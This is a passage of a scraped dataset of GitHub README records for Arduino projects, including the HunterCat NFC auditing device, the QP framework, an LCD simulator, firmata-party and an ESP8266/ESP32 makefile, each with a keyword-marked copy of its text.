host interface\nISO/IEC 14443A, ISO/IEC 14443B PCD designed according to NFC Forum digital protocol T4T platform and ISO-DEP\nFeliCa PCD mode\nMIFARE Classic PCD encryption mechanism (MIFARE Classic 1K/4K)\nNFC Forum tag 1 to 5 (MIFARE Ultralight, Jewel, Open FeliCa tag, MIFAREDESFire\nISO/IEC 15693/ICODE VCD mode\nIncludes NXP ISO/IEC14443-A and Innovatron ISO/IEC14443-B intellectual property licensing rights\nLicense\nElectronic Cats invests time and resources providing this open source design, please support Electronic Cats and open-source hardware by purchasing products from Electronic Cats!\nDesigned by Electronic Cats.\nFirmware released under an GNU AGPL v3.0 license. See the LICENSE file for more information.\nHardware released under an CERN Open Hardware Licence v1.2. See the LICENSE_HARDWARE file for more information.\nElectronic Cats is a registered trademark, please do not use if you sell these PCBs.\nNovember 2019", "link": "https://github.com/ElectronicCats/HunterCatNFC", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "huntercat nfc\nhow does the hunter cat nfc work?\nthe hunter cat nfc is the latest security -----> tool !!!  for contactless (near field communication) used in access control, identification and bank cards. specially created to identify nfc readers and sniffing tools, with this tool you can audit, read or emulate cards of different types.\nunderstanding the hunter cat nfc and its leds\nthe device has a preloaded reader detection firmware that lets the user know when he is near an nfc reader that is trying to read his card.\nreader detection\ndetect hidden readers seeking to read your cards without authorization for cloning\n1.- turn on hunter cat nfc 2.- wait for the leds to turn off 3.-red led flashes every 1 second 4.- approach the reader, the huntercat nfc leds should light up indicating if an nfc reader was detected. 5.- if it does not turn on and the led stays on, it is not near an nfc reader.\nhow does it work?\nhunter cat nfc can be set to behave either as an nfc reader a tag or to establish a two-way connection with another nfc device.\nnfc usb dongle features a samd21 mcu which works in conjunction with the pn7150. the usb interface is provided by samd21 mcu, and the nfc functionality is ensured thanks to pn7150.\nnfc is designed to be intuitive for users. the communication between two devices is established in the simplest way possible \u2014 by bringing them close to each other. nfc frontend can operate in three distinct modes:\ncard emulation mode \u2014 where huntercat nfc behaves like a smart card or a tag\nin this mode, huntercat nfc emulates a nfc tag. it doesn\u2019t initiate the communication, it only responds to a nfc reader. a typical application of the card emulation mode is how people use nfc in their smartphones to replace several cards, badges or tags at once (using the same phone for rfid access controls, contactless payments and so on). card emulation mode, however, is not useful just for smartphones, but for any type of portable device.\nread/write \u2014 where huntercat nfc behaves as an nfc reader/writer\nhere, hunter cat communicates with a passive tag, nfc smart card, or an nfc device operating in card emulation mode. it can read or write to a tag (although reading is a more common use-case because tags will often be write protected). in this mode, the huntercat nfc generates the rf field, while a tag or card only modulates it.\npeer-to-peer \u2014 for more complex interactions\npeer-to-peer mode establishes a two-way communication channel between a pair of nfc-enabled devices. when a user brings two devices close to each other, the two nfc chips establish a p2p connection and exchange data.\ncharacteristics:\nprocesador cortex m0+\nusb c 2.0\nnfc reader, card and nfc forum\narduino compatible\ncircuitpython compatible\nuf2 bootloader\n3 leds status\nopen hardware\nbattery\nrf protocols supported\nnfcip-1, nfcip-2 protocol\niso/iec 14443a, iso/iec 14443b picc, nfc forum t4t modes via host interface\nnfc forum t3t via host interface\niso/iec 14443a, iso/iec 14443b pcd designed according to nfc forum digital protocol t4t platform and iso-dep\nfelica pcd mode\nmifare classic pcd encryption mechanism (mifare classic 1k/4k)\nnfc forum tag 1 to 5 (mifare ultralight, jewel, open felica tag, mifaredesfire\niso/iec 15693/icode vcd mode\nincludes nxp iso/iec14443-a and innovatron iso/iec14443-b intellectual property licensing rights\nlicense\nelectronic cats invests time and resources providing this open source design, please support electronic cats and open-source hardware by purchasing products from electronic cats!\ndesigned by electronic cats.\nfirmware released under an gnu agpl v3.0 license. see the license file for more information.\nhardware released under an cern open hardware licence v1.2. see the license_hardware file for more information.\nelectronic cats is a registered trademark, please do not use if you sell these pcbs.\nnovember 2019", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000984, "year": null}, {"Unnamed: 0": 3025, "autor": 985, "date": null, "content": "This README provides a quick overview of QP for Arduino. Please refer to the companion webiste to this project at:\nhttps://www.state-machine.com/arduino\nSoftware Installation\nThe QP adaptation for Arduino is distributed in a single ZIP archive qp-<ver>_arduino-1.8.x.zip, where <ver> stands for the version of the QP frameworks.\nYou need to unzip the qp-<ver>_arduino-1.8.x.zip archive into your Arduino <Sketchbook> folder. To find out where your <Sketchbook> folder is, or to configure a different location for your <Sketchbook> folder, you need to open the Arduino IDE and select File|Preferences menu. The Sketchbook location will be shown at the top of the Preferences dialog box. Once you identify the <Sketchbook> folder, you simply unzip the whole qp-<ver>_arduino-1.8.x.zip archive to this folder.\nProvided Libraries and Examples\nThe archive qp-<ver>_arduino-1.8.x.zip contains two external libraries for SAM-based Arduinos:\nqpcpp_sam -- QP/C++ framework for SAM-based Arduinos\nqpn_avr -- QP-nano framework for AVR-based Arduinos\nNOTE: qpn_avr is now obsolete. It is provided for backgwards compatibility only!\nProvided Tools\nThe archive also contains the QM modeling tool for Windows\nqm -- QM modeling tool for Windows 32/64-bit\nDirectories and Files\nAfter the installation, your Arduino <Sketchbook> folder should look as follows:\n<Sketchbook>/ - your Arduino Sketchbook folder\n|\n+-libraries/ - libraries folder\n| +-qpcpp_arm-cm/ - QP/C++ library for ARM Cortex-M based boards\n| | +-examples/ - QP/C++ library examples\n| | | +-blinky-sam/ - Blinky example for SAM-based Arduinos\n| | | | +-blinky-sam.ino - Blinky code (generated)\n| | | | +-blinky-sam.qm - Blinky model (for QM tool)\n| | | +-blinky_bsp-sam/ - Blinky example with Board Support Package for SAM\n| | | | +-blinky_bsp-sam.ino - Blinky code (generated)\n| | | | +-blinky_bsp-sam.qm - Blinky model (for QM tool)\n| | | +-blinky_bsp-teensy4/ - Blinky example with Board Support Package for Teensy4\n| | | | +-blinky_bsp-teensy4.ino - Blinky code (generated)\n| | | | +-blinky_bsp-teensy4.qm - Blinky model (for QM tool)\n| | | +-dpp_bsp-sam/ - Dining Philosopher example with BSP for SAM\n| | | | +-dpp_bsp-sam.ino - DPP code (generated)\n| | | | +-dpp_bsp-sam.qm - DPP model (for QM tool)\n| | +-src/ - QP/C++ library source code\n| | | +-qpcpp.h - QP/C++ library header file\n| | | +-... - QP/C++ library sources\n| | +-library.properties - QP/C++ library properties\n| |\n+-libraries/ - libraries folder\n| +-qpn_avr/ - QP-nano library for AVR-based Arduinos\n| | +-... (now obsolete, for backgwards compatibility only)\n| |\n| +-qm/ - QM modeling tool for Windows\n| | +-bin/ - QM binaries (executable and DLLs)\n| | | +-qm.exe - QM executable for Windows\n| | +-Resources/ - QM resources\n| | | +-...\n|\n+-README.md - this file\n+-QP-Arduino_GPL_Exception.txt - GPL exception for QP on Arduino\nNOTE: The QP-Arduino archive contains QM for Windows only. But QM is also available for Linux and MacOS hosts. If you wish to work on those operating systems, you will need to install QM separately, as described at: https://www.state-machine.com/qm/gs.html\nWorking with the Examples\nAssumming that you have installed the QP library in your <Sketchbook> folder, the examples provided in each QP library show up in the Arduino IDE under the menu:\nFile|Examples|Examples from Custom Libraries\nThe intended way of working with the examples is to use the QM modeling tool to modify the models (.qm files) and then to generate code from these models. In this scenario, the Arduino IDE is used only to build and upload the code to the Arduino board(s).\nNOTE: The preferences in the Arduino IDE should be set up to Use external editor so that the IDE will update the code each time it is re-generated by the QM modeling tool.\nExample Documentation\nEach example model has documentation, which you can view in the QM tool. The model documentation shows in the Property Editor when the model item is active.\nLicensing\nThe QP/C++ real-time embedded framework (RTEF) for Arduino are licensed under the modified GPLv3 license with the QP-Arduino Exception (see also the file QP-Arduino_GPL_Exception.txt in the root of the archive). Specifically, the Exception removes the requirement to expose your propriatory source code as long as you deploy it on an Arduino-Certified board.\nThe QM model-based design tool is freeware. The QM tool is provided under the terms of a simple End-User License Agreement (EULA).\nCompanion Web Page\nPlease refer to the companion web page to this project at:\nhttps://www.state-machine.com/arduino\nSupport Questions\nPlease submit any questions or comments to the free QP support forum at:\nhttps://sourceforge.net/p/qpc/discussion/668726", "link": "https://github.com/QuantumLeaps/qp-arduino", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "this readme provides a quick overview of qp for arduino. please refer to the companion webiste to this project at:\nhttps://www.state-machine.com/arduino\nsoftware installation\nthe qp adaptation for arduino is distributed in a single zip archive qp-<ver>_arduino-1.8.x.zip, where <ver> stands for the version of the qp frameworks.\nyou need to unzip the qp-<ver>_arduino-1.8.x.zip archive into your arduino <sketchbook> folder. to find out where your <sketchbook> folder is, or to configure a different location for your <sketchbook> folder, you need to open the arduino ide and select file|preferences menu. the sketchbook location will be shown at the top of the preferences dialog box. once you identify the <sketchbook> folder, you simply unzip the whole qp-<ver>_arduino-1.8.x.zip archive to this folder.\nprovided libraries and examples\nthe archive qp-<ver>_arduino-1.8.x.zip contains two external libraries for sam-based arduinos:\nqpcpp_sam -- qp/c++ framework for sam-based arduinos\nqpn_avr -- qp-nano framework for avr-based arduinos\nnote: qpn_avr is now obsolete. it is provided for backgwards compatibility only!\nprovided tools\nthe archive also contains the qm modeling -----> tool !!!  for windows\nqm -- qm modeling -----> tool !!!  for windows 32/64-bit\ndirectories and files\nafter the installation, your arduino <sketchbook> folder should look as follows:\n<sketchbook>/ - your arduino sketchbook folder\n|\n+-libraries/ - libraries folder\n| +-qpcpp_arm-cm/ - qp/c++ library for arm cortex-m based boards\n| | +-examples/ - qp/c++ library examples\n| | | +-blinky-sam/ - blinky example for sam-based arduinos\n| | | | +-blinky-sam.ino - blinky code (generated)\n| | | | +-blinky-sam.qm - blinky model (for qm tool)\n| | | +-blinky_bsp-sam/ - blinky example with board support package for sam\n| | | | +-blinky_bsp-sam.ino - blinky code (generated)\n| | | | +-blinky_bsp-sam.qm - blinky model (for qm tool)\n| | | +-blinky_bsp-teensy4/ - blinky example with board support package for teensy4\n| | | | +-blinky_bsp-teensy4.ino - blinky code (generated)\n| | | | +-blinky_bsp-teensy4.qm - blinky model (for qm tool)\n| | | +-dpp_bsp-sam/ - dining philosopher example with bsp for sam\n| | | | +-dpp_bsp-sam.ino - dpp code (generated)\n| | | | +-dpp_bsp-sam.qm - dpp model (for qm tool)\n| | +-src/ - qp/c++ library source code\n| | | +-qpcpp.h - qp/c++ library header file\n| | | +-... - qp/c++ library sources\n| | +-library.properties - qp/c++ library properties\n| |\n+-libraries/ - libraries folder\n| +-qpn_avr/ - qp-nano library for avr-based arduinos\n| | +-... (now obsolete, for backgwards compatibility only)\n| |\n| +-qm/ - qm modeling tool for windows\n| | +-bin/ - qm binaries (executable and dlls)\n| | | +-qm.exe - qm executable for windows\n| | +-resources/ - qm resources\n| | | +-...\n|\n+-readme.md - this file\n+-qp-arduino_gpl_exception.txt - gpl exception for qp on arduino\nnote: the qp-arduino archive contains qm for windows only. but qm is also available for linux and macos hosts. if you wish to work on those operating systems, you will need to install qm separately, as described at: https://www.state-machine.com/qm/gs.html\nworking with the examples\nassumming that you have installed the qp library in your <sketchbook> folder, the examples provided in each qp library show up in the arduino ide under the menu:\nfile|examples|examples from custom libraries\nthe intended way of working with the examples is to use the qm modeling tool to modify the models (.qm files) and then to generate code from these models. in this scenario, the arduino ide is used only to build and upload the code to the arduino board(s).\nnote: the preferences in the arduino ide should be set up to use external editor so that the ide will update the code each time it is re-generated by the qm modeling tool.\nexample documentation\neach example model has documentation, which you can view in the qm tool. the model documentation shows in the property editor when the model item is active.\nlicensing\nthe qp/c++ real-time embedded framework (rtef) for arduino are licensed under the modified gplv3 license with the qp-arduino exception (see also the file qp-arduino_gpl_exception.txt in the root of the archive). specifically, the exception removes the requirement to expose your propriatory source code as long as you deploy it on an arduino-certified board.\nthe qm model-based design tool is freeware. the qm tool is provided under the terms of a simple end-user license agreement (eula).\ncompanion web page\nplease refer to the companion web page to this project at:\nhttps://www.state-machine.com/arduino\nsupport questions\nplease submit any questions or comments to the free qp support forum at:\nhttps://sourceforge.net/p/qpc/discussion/668726", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000985, "year": null}, {"Unnamed: 0": 3039, "autor": 999, "date": null, "content": "Graphics LCD Simulator\nGraphics LCD prototyping tool for hobbyists\nMAX7219 Simulation\nST7920 Simulation\nDemo\nOverview\nThe client can be configured to use either Serial or TCP/IP for data transmission.\nArduino\nThe Arduino client extends from the U8g2 class. It can then be used just like how it is used in any actual u8g2 development. Data is transmitted from the client to the simulator program (via Serial or TCP/IP)\nRequirements\n64 bit Java 8 or higher\nClient libraries\nArduino client (Also available in Platform IO)\nJava client (Using ucgdisplay)\nC/C++ (Coming soon)\nProject Resources\nRelease\nSnapshots\nLimitations\nDoes not yet support 32 bit java (ucgdisplay only supports 64bit at the moment)\nNot yet compatible with Java 11\nInstallation\nManual\nExtract the archive glcd-emulator-<version>-amd64.zip or glcd-emulator-<version>-amd64.tar.gz to any directory and use the run script to start the application\nInstaller\nExecute any of the files below whatever matches your target operating system.\nWindows: glcd-emulator-setup-amd64.exe\nLinux (Debian): glcd-emulator-<version>-amd64.deb\nMac OSX: glcd-emulator-<version>-amd64.pkg\nFeatures\nCross-platform\nSupports Windows, Mac OSX and Linux\nClient available for Arduino/C/C++ and Java clients\nSee Client Libraries\nCustomizable look and feel\nFont Browser\nBrowse through all available u8g2 fonts\nSupports over 40+ displays\nMost displays are available and supported by the simulator, but some limitations may apply depending on the hardware used.\nScreenshots\nTake screenshots (Use F5 key) and save it as PNG image format\nDeveloper mode\nDeveloper mode allows you to play around with the functions available in the u8g2 graphics library. You will be able to preview the output and inspect the generated instructions for the operation. Please note that this is not enabled by default, you can enable this by specifying the -dev application startup parameter.\nProfile Support\nYou can create profiles to store individual settings", "link": "https://github.com/ribasco/glcd-emulator", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "graphics lcd simulator\ngraphics lcd prototyping -----> tool !!!  for hobbyists\nmax7219 simulation\nst7920 simulation\ndemo\noverview\nthe client can be configured to use either serial or tcp/ip for data transmission.\narduino\nthe arduino client extends from the u8g2 class. it can then be used just like how it is used in any actual u8g2 development. data is transmitted from the client to the simulator program (via serial or tcp/ip)\nrequirements\n64 bit java 8 or higher\nclient libraries\narduino client (also available in platform io)\njava client (using ucgdisplay)\nc/c++ (coming soon)\nproject resources\nrelease\nsnapshots\nlimitations\ndoes not yet support 32 bit java (ucgdisplay only supports 64bit at the moment)\nnot yet compatible with java 11\ninstallation\nmanual\nextract the archive glcd-emulator-<version>-amd64.zip or glcd-emulator-<version>-amd64.tar.gz to any directory and use the run script to start the application\ninstaller\nexecute any of the files below whatever matches your target operating system.\nwindows: glcd-emulator-setup-amd64.exe\nlinux (debian): glcd-emulator-<version>-amd64.deb\nmac osx: glcd-emulator-<version>-amd64.pkg\nfeatures\ncross-platform\nsupports windows, mac osx and linux\nclient available for arduino/c/c++ and java clients\nsee client libraries\ncustomizable look and feel\nfont browser\nbrowse through all available u8g2 fonts\nsupports over 40+ displays\nmost displays are available and supported by the simulator, but some limitations may apply depending on the hardware used.\nscreenshots\ntake screenshots (use f5 key) and save it as png image format\ndeveloper mode\ndeveloper mode allows you to play around with the functions available in the u8g2 graphics library. you will be able to preview the output and inspect the generated instructions for the operation. please note that this is not enabled by default, you can enable this by specifying the -dev application startup parameter.\nprofile support\nyou can create profiles to store individual settings", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000999, "year": null}, {"Unnamed: 0": 3049, "autor": 1009, "date": null, "content": "\ud83c\udf88 \ud83c\udf89 firmata-party \ud83c\udf89 \ud83c\udf88\nThis CLI tool provides a quick way to flash Standard Firmata to your Arduino board.\nInstall\nInstall NodeJS from nodejs.org\nRun npm install -g firmata-party in your shell of choice\nUsage\nusage: firmata-party [<arduino name> | list] [--party] [--debug]\nfirmata-party list # list all supported boards\nfirmata-party uno [port] # flash Standard Firmata to an Arduino Uno\nfirmata-party uno [port] --debug # show debug info\nfirmata-party uno [port] --party # keep flashing firmata on new arduinos until you quit the program with ctrl+c!\nfirmata-party help # show usage info\nNote that the port will be auto-detected except in the case of the Pro Mini (see avrgirl-arduino for more info).\nSupported boards:\nArduino Uno\nArduino Mega\nArduino ADK\nArduino Leonardo\nArduino Micro\nArduino Nano\nArduino Duemilanove (168)\nArduino Duemilanove (328)\nArduino Pro Mini\nArduino Lilypad USB\nArduino Yun\nArduino Esplora\nFemtoduino IMUduino\nRedBearLab Blend Micro\nTinycircuits Tinyduino\nSparkfun Pro Micro\nQtechknow Qduino\nPinoccio Scout\nAdafruit Feather 32u4 Basic Proto\nArduboy\nAdafruit Circuit Playground Classic\nlittleBits Arduino Bit\nbqZum", "link": "https://github.com/noopkat/firmata-party", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "\ud83c\udf88 \ud83c\udf89 firmata-party \ud83c\udf89 \ud83c\udf88\nthis cli -----> tool !!!  provides a quick way to flash standard firmata to your arduino board.\ninstall\ninstall nodejs from nodejs.org\nrun npm install -g firmata-party in your shell of choice\nusage\nusage: firmata-party [<arduino name> | list] [--party] [--debug]\nfirmata-party list # list all supported boards\nfirmata-party uno [port] # flash standard firmata to an arduino uno\nfirmata-party uno [port] --debug # show debug info\nfirmata-party uno [port] --party # keep flashing firmata on new arduinos until you quit the program with ctrl+c!\nfirmata-party help # show usage info\nnote that the port will be auto-detected except in the case of the pro mini (see avrgirl-arduino for more info).\nsupported boards:\narduino uno\narduino mega\narduino adk\narduino leonardo\narduino micro\narduino nano\narduino duemilanove (168)\narduino duemilanove (328)\narduino pro mini\narduino lilypad usb\narduino yun\narduino esplora\nfemtoduino imuduino\nredbearlab blend micro\ntinycircuits tinyduino\nsparkfun pro micro\nqtechknow qduino\npinoccio scout\nadafruit feather 32u4 basic proto\narduboy\nadafruit circuit playground classic\nlittlebits arduino bit\nbqzum", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7001009, "year": null}, {"Unnamed: 0": 3053, "autor": 1013, "date": null, "content": "Esp8266/Esp32-Arduino-Makefile for Linux and Cygwin/Windows\nMakefile to build arduino code for ESP8266 under linux and Cygwin (tested on debian X64, raspberry, CYGWIN_NT-10.0). Based on Martin Oldfield arduino makefile : http://www.mjoldfield.com/atelier/2009/02/arduino-cli.html\nChangelog\n10/15/2021-2\nESP32 : fix incorect installation of gcc 5 depndencies\n10/15/2021\nALL : perl and ard-parse-board are deprecated (faster compilation)\nESP8266 : define ARDUINO_ESP8266_MAJOR, ARDUINO_ESP8266_MINOR, ARDUINO_ESP8266_REVISION, ARDUINO_ESP8266_RELEASE_X_X_X and ARDUINO_ESP8266_RELEASE (not in the git repo)\nESP8266 : 3.0.2 (last release) support\nESP32 : 2.0.0 (last release) support\n05/27/2021\nESP8266 : fixes for 3.X support\nESP8266 : upgrade to support last stable release (3.0.1)\n05/27/2021\nESP8266 : drop support for version < 2.5.2\nESP8266 : upgrade to support last stable release (3.0.0)\nESP8266 : minor fixes for last stable release (2.7.4)\n01/02/2020\nESP8266 : upgrade to last stable release (2.6.3)\n11/28/2019\nESP8266 : upgrade to last stable release (2.6.2)\n11/27/2019\nESP8266 : fix fs_upload\n11/13/2019\nESP8266 : upgrade to last stable release (2.6.1) - fix upload command\n11/13/2019\nESP32 : default version is 1.0.4\n11/12/2019\nESP8266 : default version is 2.6.0\nESP32 : default version is 1.0.4\n06/21/2019\nESP8266 : set default upload speed to 115200 if none found\n06/20/2019\nESP8266 : cleaner #28 fix : tested only on linux with 2.4.2, 2.5.2 and last git versions\n06/19/2019\nESP8266 : new stable installation script\nESP8266 : fast and dirty #28 fix : use new elf2bin/upload python scripts\n05/23/2019\nTODO removed\n05/22/2019\nESP8266 : default version is 2.5.2\nESP32 : default version is 1.0.2\n04/11/2019\nESP8266 : default version is 2.5.0 - fix LED buitin\n03/28/2019\nESP8266-git : last git support\nESP8266 : 2.5.0 support\nESP8266 : lwip v2 lower memory as default lwip variant\n03/26/2019\nESP32 : Update for ESP32 arduino last git\nESP32 : Update for ESP32 arduino last stable release\nESP32 : Fix install scripts\n03/13/2019\nChange Shebang from #!/bin/sh to #!/bin/bash in all install scripts in order to work on recent debian releases\n01/29/2019\nESP8266-git : Update for last git\n12/20/2018\nESP8266-git : Update for last git (change in boards.txt and plateform.txt)\n12/06/2018\nESP32 : Update for ESP32 arduino last git\n12/05/2018\nALL : add EXCLUDE_USER_LIBS entry to exclude libs from auto dependencies (usefull with libraies with conditionnal includes)\nESP32 : Fix for mbedtls config file and add example (BasicHttpClient)\n10/16/2018\nESP32 : Add support for 1.0.0 version\nESP32 : Update for git version\n08/30/2018\nESP8266 : Add support for version 2.4.2 (thanks to wintersandroid for is PR)\nESP8266 : standardization of release directories naming (.git -> -git)\n07/24/2018\nALL : add Shebang to all sh files\nESP8266 : Add support for libraries/user assembly (.S) compilation (tested with gdbstub)\n06/01/2018\nESP8266-git version : Workaround for SD.h not found -> add 'ARDUINO_LIBS=SD SPI' to your Makefile\nESP8266-git version : Generation of the eagle.app.v6.common.ld file\n04/17/2018\nAdd option to log serial outputs to file (set LOG_SERIAL_TO_FILE=yes in your makefile. The out file is serial.log)\nESP8266 : Swicth to lwip V2 low memory by default\nESP32 : update for last git commit\n02/12/2018\nAdd reset target\nESP8266 : update for the last git commit (use lwip_gcc)\n12/06/2017\nESP8266 : fix 'section .text will not fit in region iram1_0_seg' with big sketches 12/01/2017:\nESP32 : update for 46d1b17 git commit\nESP32 : update installation script\nESP32 & ESP8266 :\nauto detect core esp libraries used by user libraries\nauto detect user libraries used by user libraries\nfix ArduinoJson user lib no detection\nmany enhancements\nESP8266 : add mkspiffs support (create and upload)\nESP8266 : new option to use 2.3.0 stable version (default) or git esp8266 arduino version : set ESP8266_VERSION=.git in the calling makefile (see AdvancedWebServer makefile)\nESP8266 : update for last git commit\n10/05/2017:\nESP32 : UPDATE FOR LAST esp32 Git commit\nESP32 : use esptool.exe on windows platforms\n08/11/2017:\nfix cygwin support for both esp8266 and esp32\nESP32 : update compiler flags and libs\n07/20/2017:\nReplace cat by $(CAT)\n07/19/2017:\nUse generic installers (with embedded tool get)\nsupport for ESP8266 arduino core version 2.4.0 (not released yet) with autodetection\n07/14/2017:\nESP32 support : (no arm support) see below\n01/24/2017:\nadd linux armhf install script (raspberry and others)\n12/28/2016:\ncompile c files with gcc not g++\n12/27/2016:\nREADME update\nfix for non conventional libraries (Servo for example)\nadd servo test\n06/22/2016:\nTAG fix\nadd test sketch for ino concatenation\nArduino.h is automatically included during compilation\nc files are compiled as cpp files (is it really a good thing?)\n06/21/2016:\nnew SPIFFS_SIZE param (default to 4M3M mapping) : set it to 1 in your Makefile to use the 4M1M mapping (see Makefile in included example)\nnew SERIAL_BAUD param (default to 115200) : for use with the term command\nsome change in variables names\n05/09/2016 :\nupdate to esp8266-2.2.0\nnew OTA params : OTA_IP OTA_PORT OTA_AUTH (see example)\n03/08/2016 :\nHandle subdirectories of core uniformly : pull request from surr. Thank you\n02/29/2016\nCygwin support (from intrepidor not tested)\nupdate to esp8266-2.1.0\nuser can install specific libraries in libraries dir\n02/21/2016 :\nfix mkspiffs install\n02/18/2016 :\nnew x86 and x64 linux install\ncleanup\n08/12/2015 :\nadd install script for 32 bit linux\nupdate to esp8266-2.0.0-rc2\n04/11/2015 :\nuse zip file from official link (http://arduino.esp8266.com/staging/package_esp8266com_index.json)\nESP8266 git submodule removed\nremove $(ARDUINO_CORE)/variants/$(VARIANT) to include path (not needed)\n08/10/2015 :\nadd $(ARDUINO_CORE)/variants/$(VARIANT) to include path for nodemcuv2\n29/09/2015 :\nfix README for third party tools installation\nmove post-installation out of the makefile\n23/09/2015 :\nworking dependencies\nmultiple ino files allowed\ncore & spiffs objects build in their own directories\nautodetect system and user libs used by the sketch\nMakefile renamed to esp8266Arduino.mk\nInstallation and test\nClone this repository : git clone https://github.com/thunderace/Esp8266-Arduino-Makefile.git\ninstall required tools :\nsudo apt-get update\nsudo apt-get install unzip sed\ncd ESP8266-Arduino-Makefile\nInstall third party tools : for esp8266 chmod +x esp8266-install.sh && ./esp8266-install.sh for esp32 chmod +x esp32-install.sh && ./esp32-install.sh\nfor esp8266 :\ncd example/AdvancedWebServer\nmake\nfor esp32 :\ncd example/SimpleWiFiServer\nmake\nupdate esp32 arduino core : cd esp32 && git pull\nGeneral Usage\nIn your sketch directory place a Makefile that defines anything that is project specific and follow that with a line include /path_to_Esp8266-Arduino-Makefile_directory/espXArduino.mk (see example)\nset the target :\nARDUINO_ARCH=esp32 for ESP32\nnothing or ARDUINO_ARCH=esp8266 for ESP8266\nmake upload should build your sketch and upload it...\n#dependencies\nFor esp8266, this project install the lastest stable esp8266/Arduino repository (2.3.0)\nFor esp32, this project install the master of espressif/arduino-esp32\nTODO\nbuild user libs in their own directory to avoid problems with multiple files with same name.", "link": "https://github.com/thunderace/Esp8266-Arduino-Makefile", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "esp8266/esp32-arduino-makefile for linux and cygwin/windows\nmakefile to build arduino code for esp8266 under linux and cygwin (tested on debian x64, raspberry, cygwin_nt-10.0). based on martin oldfield arduino makefile : http://www.mjoldfield.com/atelier/2009/02/arduino-cli.html\nchangelog\n10/15/2021-2\nesp32 : fix incorect installation of gcc 5 depndencies\n10/15/2021\nall : perl and ard-parse-board are deprecated (faster compilation)\nesp8266 : define arduino_esp8266_major, arduino_esp8266_minor, arduino_esp8266_revision, arduino_esp8266_release_x_x_x and arduino_esp8266_release (not in the git repo)\nesp8266 : 3.0.2 (last release) support\nesp32 : 2.0.0 (last release) support\n05/27/2021\nesp8266 : fixes for 3.x support\nesp8266 : upgrade to support last stable release (3.0.1)\n05/27/2021\nesp8266 : drop support for version < 2.5.2\nesp8266 : upgrade to support last stable release (3.0.0)\nesp8266 : minor fixes for last stable release (2.7.4)\n01/02/2020\nesp8266 : upgrade to last stable release (2.6.3)\n11/28/2019\nesp8266 : upgrade to last stable release (2.6.2)\n11/27/2019\nesp8266 : fix fs_upload\n11/13/2019\nesp8266 : upgrade to last stable release (2.6.1) - fix upload command\n11/13/2019\nesp32 : default version is 1.0.4\n11/12/2019\nesp8266 : default version is 2.6.0\nesp32 : default version is 1.0.4\n06/21/2019\nesp8266 : set default upload speed to 115200 if none found\n06/20/2019\nesp8266 : cleaner #28 fix : tested only on linux with 2.4.2, 2.5.2 and last git versions\n06/19/2019\nesp8266 : new stable installation script\nesp8266 : fast and dirty #28 fix : use new elf2bin/upload python scripts\n05/23/2019\ntodo removed\n05/22/2019\nesp8266 : default version is 2.5.2\nesp32 : default version is 1.0.2\n04/11/2019\nesp8266 : default version is 2.5.0 - fix led buitin\n03/28/2019\nesp8266-git : last git support\nesp8266 : 2.5.0 support\nesp8266 : lwip v2 lower memory as default lwip variant\n03/26/2019\nesp32 : update for esp32 arduino last git\nesp32 : update for esp32 arduino last stable release\nesp32 : fix install scripts\n03/13/2019\nchange shebang from #!/bin/sh to #!/bin/bash in all install scripts in order to work on recent debian releases\n01/29/2019\nesp8266-git : update for last git\n12/20/2018\nesp8266-git : update for last git (change in boards.txt and plateform.txt)\n12/06/2018\nesp32 : update for esp32 arduino last git\n12/05/2018\nall : add exclude_user_libs entry to exclude libs from auto dependencies (usefull with libraies with conditionnal includes)\nesp32 : fix for mbedtls config file and add example (basichttpclient)\n10/16/2018\nesp32 : add support for 1.0.0 version\nesp32 : update for git version\n08/30/2018\nesp8266 : add support for version 2.4.2 (thanks to wintersandroid for is pr)\nesp8266 : standardization of release directories naming (.git -> -git)\n07/24/2018\nall : add shebang to all sh files\nesp8266 : add support for libraries/user assembly (.s) compilation (tested with gdbstub)\n06/01/2018\nesp8266-git version : workaround for sd.h not found -> add 'arduino_libs=sd spi' to your makefile\nesp8266-git version : generation of the eagle.app.v6.common.ld file\n04/17/2018\nadd option to log serial outputs to file (set log_serial_to_file=yes in your makefile. the out file is serial.log)\nesp8266 : swicth to lwip v2 low memory by default\nesp32 : update for last git commit\n02/12/2018\nadd reset target\nesp8266 : update for the last git commit (use lwip_gcc)\n12/06/2017\nesp8266 : fix 'section .text will not fit in region iram1_0_seg' with big sketches 12/01/2017:\nesp32 : update for 46d1b17 git commit\nesp32 : update installation script\nesp32 & esp8266 :\nauto detect core esp libraries used by user libraries\nauto detect user libraries used by user libraries\nfix arduinojson user lib no detection\nmany enhancements\nesp8266 : add mkspiffs support (create and upload)\nesp8266 : new option to use 2.3.0 stable version (default) or git esp8266 arduino version : set esp8266_version=.git in the calling makefile (see advancedwebserver makefile)\nesp8266 : update for last git commit\n10/05/2017:\nesp32 : update for last esp32 git commit\nesp32 : use esptool.exe on windows platforms\n08/11/2017:\nfix cygwin support for both esp8266 and esp32\nesp32 : update compiler flags and libs\n07/20/2017:\nreplace cat by $(cat)\n07/19/2017:\nuse generic installers (with embedded -----> tool !!!  get)\nsupport for esp8266 arduino core version 2.4.0 (not released yet) with autodetection\n07/14/2017:\nesp32 support : (no arm support) see below\n01/24/2017:\nadd linux armhf install script (raspberry and others)\n12/28/2016:\ncompile c files with gcc not g++\n12/27/2016:\nreadme update\nfix for non conventional libraries (servo for example)\nadd servo test\n06/22/2016:\ntag fix\nadd test sketch for ino concatenation\narduino.h is automatically included during compilation\nc files are compiled as cpp files (is it really a good thing?)\n06/21/2016:\nnew spiffs_size param (default to 4m3m mapping) : set it to 1 in your makefile to use the 4m1m mapping (see makefile in included example)\nnew serial_baud param (default to 115200) : for use with the term command\nsome change in variables names\n05/09/2016 :\nupdate to esp8266-2.2.0\nnew ota params : ota_ip ota_port ota_auth (see 